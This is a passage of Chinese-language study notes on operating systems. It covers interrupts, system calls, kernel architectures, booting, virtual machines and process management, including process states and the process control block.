class="mord">&nbsp;INTR</span></span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord text"><span class="mord cjk_fallback">不可屏蔽中断</span><span class="mord">&nbsp;NMI</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.47em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p>
</li>
<li>
<p><strong>中断和异常的分类</strong></p>
<ul>
<li>
<p><strong>中断（外中断）</strong></p>
<ul>
<li><strong>可屏蔽中断</strong>：通过 INTR 线发出的中断请求，通过改变屏蔽字可以实现多重中断，从而使得中断处理更加灵活</li>
<li><strong>不可屏蔽中断</strong>：通过 NMI 线发出的中断请求，通常是紧急的硬件故障，如：电源掉电等。此外，异常也是不能被屏蔽的</li>
</ul>
</li>
<li>
<p><strong>异常（内中断）</strong></p>
<ul>
<li><strong>故障（Fault）</strong>：通常是由指令执行引起的异常，如：非法操作码、缺页故障、除数为 <code>0</code>、运算溢出等</li>
<li><strong>自陷（Trap）</strong>：是一种事先安排的 “异常” 事件，用于在用户态下调用操作系统内核程序，如：条件陷阱指令</li>
<li><strong>终止（Abort）</strong>：是出现了使得 CPU 无法继续执行的硬件故障，如：控制器出错、存储器校验错等</li>
</ul>
</li>
</ul>
<p>故障异常和自陷异常属于软件中断（程序性异常），终止异常和外部中断属于硬件中断。</p>
</li>
<li>
<p><strong>中断和异常的处理过程</strong></p>
<p>大致描述：当 CPU 在执行用户程序的第 <code>i</code> 条指令时检测到一个异常事件，或在执行第 <code>i</code> 条指令后发现一个中断请求信号，则 CPU 打断当前的用户程序，然后转到相应的中断或异常处理程序去执行。若中断或异常处理程序能够解决相应的问题，则在中断或异常处理程序的最后，CPU 通过执行中断或异常返回指令，回到被打断的用户程序的第 <code>i</code> 条指令或第 <code>i + 1</code> 条指令继续执行；若中断或异常处理程序发现是不可恢复的致命错误，则终止用户程序。通常情况下，对中断和异常的具体处理过程由操作系统（和驱动程序）完成。</p>
</li>
</ol>
<h4> 系统调用</h4>
<p>系统调用是指 <strong>用户在程序中调用操作系统所提供的一些子功能，系统调用可视为特殊的公共子程序</strong>。系统中的各种共享资源都由操作系统统一掌管，因此在用户程序中，凡是与资源有关的操作（如：存储分配、进行 <code>I/O</code> 传输及管理文件等），都必须通过系统调用方式向操作系统提出服务请求，并由操作系统代为完成。通常，一个操作系统提供的系统调用命令有几十条乃至上百条之多。<strong>这些系统调用按功能大致可分为如下几类：</strong></p>
<ul>
<li><strong>设备管理</strong>：完成设备的请求或释放，以及设备启动等功能</li>
<li><strong>文件管理</strong>：完成文件的读、写、创建及删除等功能</li>
<li><strong>进程控制</strong>：完成进程的创建、撤销、阻塞及唤醒等功能</li>
<li><strong>进程通信</strong>：完成进程之间的消息传递或信号传递等功能</li>
<li><strong>内存管理</strong>：完成内存的分配、回收以及获取作业占用内存区大小及始址等功能</li>
</ul>
<p>系统调用相关功能涉及系统资源管理、进程管理之类的操作，对整个系统的影响非常大，因此必定需要使用某些特权指令才能完成，所以 <strong>系统调用的处理需要由操作系统内核程序负责完成，要运行在核心态</strong>。用户程序可以执行陷入指令（又称访管指令或 trap 指令）来发起系统调用，请求操作系统提供服务。可以这么理解，用户程序执行 “陷入指令”，相当于把 CPU 的使用权主动交给操作系统内核程序（CPU 状态会从用户态进入核心态），之后操作系统内核程序再对系统调用请求做出相应处理。处理完成后，操作系统内核程序又会把 CPU 的使用权还给用户程序（CPU 状态会从核心态回到用户态）。这么设计的 <strong>目的是</strong>：用户程序不能直接执行对系统影响非常大的操作，必须通过系统调用的方式请求操作系统代为执行，以便保证系统的稳定性和安全性，防止用户程序随意更改或访问重要的系统资源，影响其他进程的运行。</p>
<p>这样，操作系统的运行环境就可以理解为：用户通过操作系统运行上层程序（如：系统提供的命令解释程序或用户自编程序），而这个上层程序的运行依赖于操作系统的底层管理程序提供服务支持，当需要管理程序服务时，系统则通过硬件中断机制进入核心态，运行管理程序；也可能是程序运行出现异常情况，被动地需要管理程序的服务，这时就通过异常处理来进入核心态。管理程序运行结束时，用户程序需要继续运行，此时通过相应的保存的程序现场退出中断处理程序或异常处理程序，返回断点处继续执行。</p>
<p>由用户态转向核心态的例子：</p>
<ol>
<li>用户程序要求操作系统的服务，即系统调用</li>
<li>发生一次中断</li>
<li>用户程序中产生了一个错误状态</li>
<li>用户程序中企图执行一条特权指令</li>
<li>从核心态转向用户态由一条指令实现，这条指令也是特权命令，一般是中断返回指令</li>
</ol>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>由用户态进入核心态，不仅状态需要切换，而且所用的堆栈也可能需要由用户堆栈切换为系统堆栈，但这个系统堆栈也是属于该进程的</p>
<p>若程序的运行由用户态转到核心态，则会用到访管指令，访管指令是在用户态使用的，所以它不可能是特权指令</p>
</div>
<h3> 操作系统结构</h3>
<p>随着操作系统功能的不断增多和代码规模的不断扩大，提供合理的结构，对于降低操作系统复杂度、提升操作系统安全与可靠性来说变得尤为重要。</p>
<ol>
<li>
<p><strong>分层法</strong></p>
<p>将操作系统分为若干层，最底层（层 0）为硬件，最高层（层 N）为用户接口，每层只能调用紧邻它的低层的功能和服务（单向依赖）。这种分层结构如下所示：</p>
<figure><figcaption>分层操作系统</figcaption></figure>
<p><strong>分层法的优点</strong>：</p>
<ul>
<li><strong>便于系统的调试和验证，简化了系统的设计和实现</strong>：第 <code>1</code> 层可先调试而无须考虑系统的其他部分，因为它只使用了基本硬件。第 <code>1</code> 层调试完且验证正确之后，就可以调试第 <code>2</code> 层，如此向上。如果在调试某层时发现错误，那么错误应在这一层上，这是因为它的低层都调试好了</li>
<li><strong>易扩充和易维护</strong>：在系统中增加、修改或替换一层中的模块或整层时，只要不改变相应层间的接口，就不会影响其他层</li>
</ul>
<p><strong>分层法的问题</strong>：</p>
<ul>
<li><strong>合理定义各层比较困难</strong>：因为依赖关系固定后，往往就显得不够灵活</li>
<li><strong>效率较差</strong>：操作系统每执行一个功能，通常要自上而下地穿越多层，各层之间都有相应的层间通信机制，这无疑增加了额外的开销，导致系统效率降低</li>
</ul>
</li>
<li>
<p><strong>模块化</strong></p>
<p><strong>将操作系统按功能划分为若干具有一定独立性的模块</strong>。每个模块具有某方面的管理功能，并规定好各模块间的接口，使各模块之间能够通过接口进行通信。还可以进一步将各模块细分为若干具有一定功能的子模块，同样也规定好各子模块之间的接口。这种设计方法被称为 <strong>模块-接口法</strong>，下图为由模块、子模块等组成的模块化操作系统结构：</p>
<figure><figcaption>模块化操作系统结构</figcaption></figure>
<p>在划分模块时，如果将模块划分得太小，虽然能降低模块本身的复杂性，但会使得模块之间的联系过多，造成系统比较混乱；如果模块划分得过大，又会增加模块内部的复杂性，显然应在两者间进行权衡。此外，在划分模块时，要充分考虑模块的独立性问题，因为模块独立性越高，各模块间的交互就越少，系统的结构也就越清晰。<strong>衡量模块的独立性主要有两个标准：</strong></p>
<ul>
<li><strong>内聚性</strong>：模块内部各部分间联系的紧密程度。内聚性越高，模块独立性越好</li>
<li><strong>耦合度</strong>：模块间相互联系和相互影响的程度。耦合度越低，模块独立性越好</li>
</ul>
<p><strong>模块化的优点</strong>：</p>
<ul>
<li>提高了操作系统设计的正确性、可理解性和可维护性</li>
<li>增强了操作系统的可适应性</li>
<li>加速了操作系统的开发过程</li>
</ul>
<p><strong>模块化的缺点</strong>：</p>
<ul>
<li>模块间的接口规定很难满足对接口的实际需求</li>
<li>各模块设计者齐头并进，每个决定无法建立在上一个已验证的正确决定的基础上，因此无法找到一个可靠的决定顺序</li>
</ul>
</li>
<li>
<p><strong>宏内核</strong></p>
<p>从操作系统的内核架构来划分；可分为 <strong>宏内核</strong> 和 <strong>微内核。</strong></p>
<p>宏内核也称单内核或大内核，是指将系统的主要功能模块都作为三个紧密联系的整体运行在核心态，从而为用户程序提供高性能的系统服务。因为各管理模块之间共享信息，能有效利用相互之间的有效特性，所以具有无可比拟的性能优势。</p>
<p>随着体系结构和应用需求的不断发展，需要操作系统提供的服务越来越复杂，操作系统的设计规模急剧增长，操作系统也面临着 “软件危机” 困境。就像一个人，越胖活动起来就越困难。所以就出现了微内核技术，就是将一些非核心的功能移到用户空间，这种设计带来的好处是方便扩展系统，所有新服务都可以在用户空间增加，内核基本不用去做改动。</p>
<p>从操作系统的发展来看，宏内核获得了绝对的胜利，目前主流的操作系统，如：Windows、Android、iOS、macOS、Linux 等，都是基于宏内核的构架。但也应注意到，微内核和宏内核一直是同步发展的，目前主流的操作系统早已不是当年纯粹的宏内核构架了，而是广泛吸取微内核构架的优点而后揉合而成的混合内核。当今宏内核构架遇到了越来越多的困难和挑战，而微内核的优势似乎越来越明显，尤其是谷歌的 Fuchsia 和华为的鸿蒙 OS，都瞄准了微内核构架。</p>
</li>
<li>
<p><strong>微内核</strong></p>
<ul>
<li>
<p><strong>微内核的基本概念</strong></p>
<p>将内核中最基本的功能保留在内核，而将那些不需要在核心态执行的功能移到用户态执行，从而降低内核的设计复杂性。那些移出内核的操作系统代码根据分层的原则被划分成若干服务程序，它们的执行相互独立，交互则都借助于微内核进行通信。</p>
<p><strong>微内核结构将操作系统划分为两大部分</strong>：</p>
<ul>
<li><strong>微内核</strong>：是指精心设计的、能实现操作系统最基本核心功能的小型内核，通常包含：与硬件处理紧密相关的部分；一些较基本的功能；客户和服务器之间的通信</li>
<li><strong>多个服务器</strong>：操作系统中的绝大部分功能都放在微内核外的一组服务器（进程）中实现，如：用于提供对进程（线程）进行管理的进程（线程）服务器、提供虚拟存储器管理功能的虚拟存储器服务器等，它们都是作为进程来实现的，运行在用户态，客户与服务器之间是借助微内核提供的消息传递机制来实现交互的</li>
</ul>
<p>在微内核结构中，为了实现高可靠性，只有微内核运行在内核态，其余模块都运行在用户态，一个模块中的错误只会使这个模块崩溃，而不会使整个系统崩溃。例如：文件服务代码运行时出了问题，宏内核因为文件服务是运行在内核态的，系统直接就崩溃了。而微内核的文件服务是运行在用户态的，只要把文件服务功能强行停止，然后重启，就可以继续使用，系统不会崩溃。</p>
</li>
<li>
<p><strong>微内核的基本功能</strong></p>
<p>微内核结构通常利用 “机制与策略分离” 的原理来构造 OS 结构，将机制部分以及与硬件紧密相关的部分放入微内核。微内核通常具有如下功能：</p>
<ul>
<li><strong>进程（线程）管理</strong>：进程（线程）之间的通信功能是微内核 OS 最基本的功能，此外还有进程的切换、进程的调度，以及多处理机之间的同步等功能，都应放入微内核中。例如：为实现进程调度功能，需要在进程管理中设置一个或多个进程优先级队列，这部分属于调度功能的机制部分，应将它放入微内核中。而对用户进程如何分类，以及优先级的确认方式，则属于策略问题，可将它们放入微内核外的进程管理服务器中</li>
<li><strong>低级存储器管理</strong>：在微内核中，只配置最基本的低级存储器管理机制，如：用于实现将逻辑地址变换为物理地址等的页表机制和地址变换机制，这一部分是依赖于硬件的，因此放入微内核。而实现虚拟存储器管理的策略，则包含应采取何种页面置换算法，采用何种内存分配与回收的策略，应将这部分放在微内核外的存储器管理服务器中</li>
<li><strong>中断和陷入处理</strong>：微内核 OS 将与硬件紧密相关的一小部分放入微内核，此时微内核的主要功能是捕获所发生的中断和陷入事件，并进行中断响应处理，在识别中断或陷入的事件后，再发送给相关的服务器来处理，故中断和陷入处理也应放入微内核。</li>
</ul>
<p>微内核操作系统将进程管理、存储器管理以及 <code>I/O</code> 管理这些功能一分为二，属于机制的很小一部分放入微内核，而绝大部分放入微内核外的各种服务器实现，大多数服务器都要比微内核大。因此，在采用客户/服务器模式时，能把微内核做得很小。</p>
</li>
<li>
<p><strong>微内核的特点</strong></p>
<p><strong>主要优点：</strong></p>
<ul>
<li><strong>扩展性和灵活性</strong>：许多功能从内核中分离出来，当要修改某些功能或增加新功能时，只需在相应的服务器中修改或新增功能，或再增加一个专用的服务器，而无须改动内核代码</li>
<li><strong>可靠性和安全性</strong></li>
<li><strong>可移植性</strong>：与 CPU 和 <code>I/O</code> 硬件有关的代码均放在内核中，而其他各种服务器均与硬件平台无关，因而将操作系统移植到另一个平台上所需做的修改是比较小的</li>
<li><strong>分布式计算</strong>：客户和服务器之间、服务器和服务器之间的通信采用消息传递机制，这就使得微内核系统能很好地支持分布式系统和网络系统</li>
</ul>
<p>微内核结构的 <strong>主要问题</strong> 是性能问题，因为需要频繁地在核心态和用户态之间进行切换，操作系统的执行开销偏大。为了改善运行效率，可以将那些频繁使用的系统服务移回内核，从而保证系统性能，但这又会使微内核的容量明显地增大。</p>
<p>虽然宏内核在桌面操作系统中取得了绝对的胜利，但是微内核在实时、工业、航空及军事应用中特别流行，这些领域都是关键任务，需要有高度的可靠性。</p>
</li>
</ul>
</li>
<li>
<p><strong>外核</strong></p>
<p>不同于虚拟机克隆真实机器，另一种策略是对机器进行分区，给每个用户整个资源的一个子集。这样，某个虚拟机可能得到磁盘的 <code>0</code> 至 <code>1023</code> 盘块，而另一台虚拟机会得到磁盘的 <code>1024</code> 至 <code>2047</code> 盘块，等等。在底层中，一种称为 <strong>外核（exokernel）</strong> 的程序在内核态中运行。它的任务是为虚拟机分配资源，并检查使用这些资源的企图，以确保没有机器会使用他人的资源。每个用户层的虚拟机可以运行自已的操作系统，但限制只能使用已经申请并且获得分配的那部分资源。</p>
<p><strong>外核机制的优点</strong> 是减少了映射层。在其他的设计中，每个虚拟机都认为它有自己的磁盘，其盘块号从 <code>0</code> 到最大编号，这样虚拟机监控程序就必须维护一张表格以重映像磁盘地址（或其他资源），有了外核，这个重映射处理就不需要了。外核只需要记录已经分配给各个虚拟机的有关资源即可。这种方法还有一个优点，它将多道程序（在外核内）与用户操作系统代码（在用户空间内）加以分离，而且相应的负载并不重，因为外核所做的只是保持多个虚拟机彼此不发生冲突。</p>
</li>
</ol>
<h3> 操作系统引导</h3>
<p>操作系统（如：Windows、Linux 等）是一种程序，程序以数据的形式存放在硬盘中，而硬盘通常分为多个区，一台计算机中又有多个或多种外部存储设备。操作系统引导是指计算机利用 CPU 运行特定程序，通过程序识别硬盘，识别硬盘分区，识别硬盘分区上的操作系统，最后通过程序启动操作系统，一环扣一环地完成上述过程。</p>
<p><strong>常见操作系统的引导过程如下：</strong></p>
<ol>
<li><strong>激活 CPU</strong>：激活的 CPU 读取 ROM 中的 boot 程序，将指令寄存器置为 BIOS（基本输入/输出系统）的第一条指令，即开始执行 BIOS 的指令</li>
<li><strong>硬件自检</strong>：启动 BIOS 程序后，先进行硬件自检，检查硬件是否出现故障。如有故障，主板会发出不同含义的蜂鸣，启动中止；如无故障，屏幕会显示 CPU、内存、硬盘等信息</li>
<li><strong>加载带有操作系统的硬盘</strong>：硬件自检后，BIOS 开始读取 Boot Sequence（通过 CMOS 里保存的启动顺序，或者通过与用户交互的方式），把控制权交给启动顺序排在第一位的存储设备，然后 CPU 将该存储设备引导扇区的内容加载到内存中</li>
<li><strong>加载主引导记录 MBR</strong>：硬盘以特定的标识符区分引导硬盘和非引导硬盘。如果发现一个存储设备不是可引导盘，就检查下一个存储设备。如无其他启动设备，就会死机。主引导记录 MBR 的作用是告诉 CPU 去硬盘的哪个主分区去找操作系统</li>
<li><strong>扫描硬盘分区表，并加载硬盘活动分区</strong>：MBR 包含硬盘分区表，硬盘分区表以特定的标识符区分活动分区和非活动分区。主引导记录扫描硬盘分区表，进而识别含有操作系统的硬盘分区（活动分区）。找到硬盘活动分区后，开始加载硬盘活动分区，将控制权交给活动分区</li>
<li><strong>加载分区引导记录 PBR</strong>：读取活动分区的第一个扇区，这个扇区称为分区引导记录（PBR），其作用是寻找并激活分区根目录下用于引导操作系统的程序（启动管理器）</li>
<li><strong>加载启动管理器</strong>：分区引导记录搜索活动分区中的启动管理器，加载启动管理器</li>
<li><strong>加载操作系统</strong></li>
</ol>
<h3> 虚拟机</h3>
<p><strong>虚拟机是一台逻辑计算机</strong>，是指利用特殊的虚拟化技术，通过隐藏特定计算平台的实际物理特性，为用户提供抽象的、统一的、模拟的计算环境。<strong>有两类虚拟化方法：</strong></p>
<ol>
<li>
<p><strong>第一类虚拟机管理程序（裸金属架构）</strong></p>
<p>从技术上讲，第一类虚拟机管理程序就像一个操作系统，因为它是唯一一个运行在最高特权级的程序。它在裸机上运行并且具备多道程序功能。虚拟机管理程序向上层提供若干台虚拟机，这些虚拟机是裸机硬件的精确复制品。由于每台虚拟机都与裸机相同，所以在不同的虚拟机上可以运行任何不同的操作系统。</p>
<p>虚拟机作为用户态的一个进程运行，不允许执行敏感指令。然而，虚拟机上的操作系统认为自已运行在内核态（实际上不是），称为 <strong>虚拟内核态</strong>。虚拟机中的用户进程认为自已运行在用户态（实际上确实是）。当虚拟机操作系统执行了一条 CPU 处于内核态才允许执行的指令时，会陷入虚拟机管理程序。在支持虚拟化的 CPU 上，虚拟机管理程序检查这条指令是由虚拟机中的操作系统执行的还是由用户程序执行的。如果是前者，虚拟机管理程序将安排这条指令功能的正确执行。否则，虚拟机管理程序将模拟真实硬件面对用户态执行敏感指令时的行为。</p>
<p>在过去不支持虚拟化的 CPU 上，真实硬件不会直接执行虚拟机中的敏感指令，这些敏感指令被转为对虚拟机管理程序的调用，由虚拟机管理程序模拟这些指令的功能。</p>
</li>
<li>
<p><strong>第二类虚拟机管理程序（寄居架构）</strong></p>
<p>是一个依赖于 Windows、Linux 等操作系统分配和调度资源的程序，像一个普通的进程。第二类虚拟机管理程序仍然伪装成具有 CPU 和各种设备的完整计算机。VMware Workstation 是首个 X86 平台上的第二类虚拟机管理程序。</p>
<p>运行在第二类虚拟机管理程序上的操作系统都称为 <strong>客户操作系统</strong>。对于第二类虚拟机管理程序，运行在底层硬件上的操作系统称为 <strong>宿主操作系统。</strong></p>
<p>首次启动时，第二类虚拟机管理程序像一台刚启动的计算机那样运转，期望找到的驱动器可以是虚拟设备。然后将操作系统安装到虚拟磁盘上（其实只是宿主操作系统中的一个文件）。客户操作系统安装完成后，就能启动并运行。</p>
<p>虚拟化在 Web 主机领域很流行。没有虚拟化，服务商只能提供共享托管（不能控制服务器的软件）和独占托管（成本较高）。当服务商提供租用虚拟机时，一台物理服务器就可以运行多个虚拟机，每个虚拟机看起来都是一台完整的服务器，客户可以在虚拟机上安装自己想用的操作系统和软件，但是只需支付较低的费用。这就是市面上常见的 “云” 主机。</p>
</li>
</ol>
<h2> 进程与线程</h2>
<h3> 进程与线程</h3>
<h4> 进程的概念和特征</h4>
<p>在多道程序环境下，允许多个程序并发执行，此时它们将失去封闭性，并具有间断性及不可再现性的特征。为此引入了进程（Process）的概念，以便更好地描述和控制程序的并发执行，实现操作系统的并发性和共享性（最基本的两个特性）。</p>
<p>为了使参与并发执行的每个程序（含数据）都能独立地运行，必须为之配置一个专门的数据结构，称为 <strong>进程控制块（Process Control Block，PCB）</strong>。系统利用 PCB 来描述进程的基本情况和运行状态，进而控制和管理进程。由程序段、相关数据段和 PCB 三部分构成了 <strong>进程实体</strong>（又称进程映像）。所谓创建进程，实质上是创建进程实体中的 PCB；而撤销进程，实质上是撤销进程的 PCB。值得注意的是，进程映像是静态的，进程则是动态的。</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>PCB 是进程存在的唯一标志</p>
</div>
<p>从不同的角度，进程可以有不同的定义，<strong>比较典型的定义有：</strong></p>
<ul>
<li>进程是程序的一次执行过程</li>
<li>进程是一个程序及其数据在处理机上顺序执行时所发生的活动</li>
<li>进程是具有独立功能的程序在一个数据集合上运行的过程，它是系统进行资源分配和调度的一个独立单位</li>
</ul>
<p>引入进程实体的概念后，可以把 <strong>传统操作系统中的进程定义为</strong>：进程是进程实体的运行过程，是系统进行资源分配和调度的一个独立单位。</p>
<p>系统资源是指处理机、存储器和其他设备服务于某个进程的 “时间”，例如：把处理机资源理解为处理机的时间片才是准确的。因为进程是这些资源分配和调度的独立单位，即 “时间片” 分配的独立单位，这就决定了进程一定是一个动态的、过程性的概念。</p>
<p>进程是由多道程序的并发执行而引出的，它和程序是两个截然不同的概念。<strong>进程的基本特征</strong> 是对比单个程序的顺序执行提出的，也是对进程管理提出的基本要求。</p>
<ul>
<li><strong>动态性</strong>：进程是程序的一次执行，它有着创建、活动、暂停、终止等过程，具有一定的生命周期，是动态地产生、变化和消亡的。动态性是进程最基本的特征</li>
<li><strong>并发性</strong>：指多个进程实体同存于内存中，能在一段时间内同时运行。引入进程的目的就是使进程能和其他进程并发执行。并发性是进程的重要特征，也是操作系统的重要特征</li>
<li><strong>独立性</strong>：指进程实体是一个能独立运行、独立获得资源和独立接受调度的基本单位。凡未建立 PCB 的程序，都不能作为一个独立的单位参与运行</li>
<li><strong>异步性</strong>：由于进程的相互制约，使得进程按各自独立的、不可预知的速度向前推进。异步性会导致执行结果的不可再现性，为此在操作系统中必须配置相应的进程同步机制</li>
</ul>
<h4> 进程的状态与转换</h4>
<p>进程在其生命周期内，由于系统中各进程之间的相互制约及系统的运行环境的变化，使得进程的状态也在不断地发生变化。<strong>通常进程有以下五种状态，前三种是进程的基本状态：</strong></p>
<ul>
<li><strong>创建态</strong>：进程正在被创建，尚未转到就绪态。<strong>创建进程步骤</strong>：首先申请一个空白 PCB，并向 PCB 中填写用于控制和管理进程的信息；然后为该进程分配运行时所必须的资源；最后把该进程转入就绪态并插入就绪队列。但是，如果进程所需的资源尚不能得到满足，如内存不足，则创建工作尚未完成，进程此时所处的状态称为 <strong>创建态</strong></li>
<li><strong>运行态</strong>：进程正在处理机上运行。在单处理机中，每个时刻只有一个进程处于运行态</li>
<li><strong>就绪态</strong>：进程获得了除处理机外的一切所需资源，一旦得到处理机，便可立即运行。系统中处于就绪状态的进程可能有多个，通常将它们排成一个队列，称为 <strong>就绪队列</strong></li>
<li><strong>阻塞态</strong>：又称等待态。进程正在等待某一事件而暂停运行，如：等待某资源为可用（不包括处理机）或等待输入/输出完成。即使处理机空闲，该进程也不能运行。系统通常将处于阻塞态的进程也排成一个队列，甚至根据阻塞原因的不同，设置多个 <strong>阻塞队列</strong></li>
<li><strong>终止态</strong>：进程正从系统中消失，可能是进程正常结束或其他原因退出运行。进程需要结束运行时，系统首先将该进程置为终止态，然后进一步处理资源释放和回收等工作</li>
</ul>
<p><strong>就绪态和阻塞（等待）态的区别</strong>：就绪态是指进程仅缺少处理器，只要获得处理机资源就立即运行；而等待态是指进程需要其他资源（除了处理机）或等待某一事件。之所以把处理机和其他资源划分开，是因为在分时系统的时间片轮转机制中，每个进程分到的时间片是若干毫秒。也就是说，进程得到处理机的时间很短且非常频繁，进程在运行过程中实际上是频繁地转换到就绪态的；而其他资源（如：外设）的使用和分配或某一事件的发生（如：<code>I/O</code> 操作的完成）对应的时间相对来说很长，进程转换到等待态的次数也相对较少。</p>
<p><strong>就绪态、运行态和阻塞态之间的转换如下：</strong></p>
<ul>
<li><strong>就绪态→运行态</strong>：处于就绪态的进程被调度后，获得处理机资源（分派处理机时间片），于是进程由就绪态转换为运行态</li>
<li><strong>运行态→就绪态</strong>：处于运行态的进程在时间片用完后，不得不让出处理机，从而进程由运行态转换为就绪态。此外，在可剥夺的操作系统中，当有更高优先级的进程就绪时，调度程序将正在执行的进程转换为就绪态，让更高优先级的进程执行</li>
<li><strong>运行态→阻塞态</strong>：进程请求某一资源（如：外设）的使用和分配或等待某一事件的发生（如：<code>I/O</code> 操作的完成）时，它就从运行态转换为阻塞态。进程以系统调用的形式请求操作系统提供服务，这是一种特殊的、由运行用户态程序调用操作系统内核过程的形式</li>
<li><strong>阻塞态→就绪态</strong>：进程等待的事件到来时，如：<code>I/O</code> 操作结束或中断结束时，中断处理程序必须把相应进程的状态由阻塞态转换为就绪态</li>
</ul>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>一个进程从运行态转换为阻塞态是主动行为，而从阻塞态转换为就绪态是被动行为，需要其他相关进程的协助</p>
</div>
<h4> 进程的组成</h4>
<p>进程是一个独立的运行单位，也是操作系统进行资源分配和调度的基本单位。它由以下三部分组成，其中 <strong>最核心的是进程控制块（PCB）。</strong></p>
<ol>
<li>
<p><strong>进程控制块（PCB）</strong></p>
<p>进程创建时，操作系统为它新建一个 PCB，该结构之后常驻内存，任意时刻都可以存取，并在进程结束时删除。PCB 是进程实体的一部分，是进程存在的唯一标志。</p>
<p>进程执行时，系统通过其 PCB 了解进程的现行状态信息，以便操作系统对其进行控制和管理；进程结束时，系统收回其 PCB，该进程随之消亡。</p>
<p>当操作系统欲调度某进程运行时，要从该进程的 PCB 中查出其现行状态及优先级；在调度到某进程后，要根据其 PCB 中所保存的处理机状态信息，设置该进程恢复运行的现场，并根据其 PCB 中的程序和数据的内存始址，找到其程序和数据；进程在运行过程中，当需要和与之合作的进程实现同步、通信或访问文件时，也需要访问 PCB；当进程由于某种原因而暂停运行时，又需将其断点的处理机环境保存在 PCB 中。可见，在进程的整个生命期中，系统总是通过 PCB 对进程进行控制的，即系统唯有通过进程的 PCB 才能感知到该进程的存在。</p>
<p>下表是一个 PCB 的实例。<strong>PCB 主要包括</strong>：进程描述信息、进程控制和管理信息、资源分配清单和处理机相关信息等。<strong>各部分的主要说明如下：</strong></p>
<table>
<thead>
<tr>
<th style="text-align:center">进程描述信息</th>
<th style="text-align:center">进程控制和管理信息</th>
<th style="text-align:center">资源分配清单</th>
<th style="text-align:center">处理机相关信息</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">进程标识符（PID）</td>
<td style="text-align:center">进程当前状态</td>
<td style="text-align:center">代码段指针</td>
<td style="text-align:center">通用寄存器值</td>
</tr>
<tr>
<td style="text-align:center">用户标识符（UID）</td>
<td style="text-align:center">进程当前优先级</td>
<td style="text-align:center">数据段指针</td>
<td style="text-align:center">地址寄存器值</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">代码运行入口地址</td>
<td style="text-align:center">堆栈段指针</td>
<td style="text-align:center">控制寄存器值</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">程序的外存地址</td>
<td style="text-align:center">文件描述符</td>
<td style="text-align:center">标志寄存器值</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">进入内存时间</td>
<td style="text-align:center">键盘</td>
<td style="text-align:center">状态字</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">处理机占用时间</td>
<td style="text-align:center">鼠标</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">信号量使用</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
</tbody>
</table>
<ul>
<li>
<p><strong>进程描述信息</strong></p>
<ul>
<li><strong>进程标识符（PID）</strong>：标志各个进程，每个进程都有一个唯一的标识号</li>
<li><strong>用户标识符（UID）</strong>：进程归属的用户，用户标识符主要为共享和保护服务</li>
</ul>
</li>
<li>
<p><strong>进程控制和管理信息</strong></p>
<ul>
<li><strong>进程当前状态</strong>：描述进程的状态信息，作为处理机分配调度的依据</li>
<li><strong>进程优先级</strong>：描述进程抢占处理机的优先级，优先级高的进程可优先获得处理机</li>
</ul>
</li>
<li>
<p><strong>资源分配清单</strong>：用于说明有关内存地址空间或虚拟地址空间的状况，所打开文件的列表和所使用的输入/输出设备信息</p>
</li>
<li>
<p><strong>处理机相关信息</strong>：也称处理机的上下文，主要指处理机中各寄存器的值。当进程处于执行态时，处理机的许多信息都在寄存器中。当进程被切换时，处理机状态信息都必须保存在相应的 PCB 中，以便在该进程重新执行时，能从断点继续执行</p>
</li>
</ul>
<p>在一个系统中，通常存在着许多进程的 PCB，有的处于就绪态，有的处于阻塞态，而且阻塞的原因各不相同。为了方便进程的调度和管理，需要将各进程的 PCB 用适当的方法组织起来。目前，<strong>常用的组织方式有：</strong></p>
<ul>
<li><strong>链接方式</strong>：将同状态的 PCB 链接成一个队列，不同状态对应不同的队列，也可把处于阻塞态的进程的 PCB，根据其阻塞原因的不同，排成多个阻塞队列</li>
<li><strong>索引方式</strong>：将同一状态的进程组织在一个索引表中，索引表的表项指向相应的 PCB，不同状态对应不同的索引表，如：就绪索引表和阻塞索引表等</li>
</ul>
</li>
<li>
<p><strong>程序段</strong></p>
<p>程序段就是能被进程调度程序调度到 CPU 执行的程序代码段。注意，程序可被多个进程共享，即多个进程可以运行同一个程序。</p>
</li>
<li>
<p><strong>数据段</strong></p>
<p>一个进程的数据段，可以是进程对应的程序加工处理的原始数据，也可以是程序执行时产生的中间或最终结果。</p>
</li>
</ol>
<h4> 进程控制</h4>
<p><strong>进程控制的主要功能</strong> 是对系统中的所有进程实施有效的管理，它具有创建新进程、撤销已有进程、实现进程状态转换等功能。在操作系统中，一般 <strong>把进程控制用的程序段称为原语</strong>，原语的特点是执行期间不允许中断，它是一个不可分割的基本单位。</p>
<ol>
<li>
<p><strong>进程的创建</strong></p>
<p>允许一个进程创建另一个进程，此时 <strong>创建者称为父进程，被创建的进程称为子进程</strong>。子进程可以继承父进程所拥有的资源。当子进程被撤销时，应将其从父进程那里获得的资源归还给父进程。此外，在撤销父进程时，通常也会同时撤销其所有的子进程。</p>
<p>在操作系统中，终端用户登录系统、作业调度、系统提供服务、用户程序的应用请求等都会引起进程的创建。<strong>创建一个新进程的过程如下（创建原语）：</strong></p>
<ul>
<li>为新进程分配一个唯一的进程标识号，并申请一个空白 PCB（PCB 是有限的）。若 PCB 申请失败，则创建失败</li>
<li>为进程分配其运行所需的资源，如：内存、文件、<code>I/O</code> 设备和 CPU 时间等（在 PCB 中体现）。这些资源或从操作系统获得，或仅从其父进程获得。如果资源不足（如：内存），则并不是创建失败，而是处于创建态，等待内存资源</li>
<li>初始化 PCB，主要包括初始化标志信息、初始化处理机状态信息和初始化处理机控制信息，以及设置进程的优先级等</li>
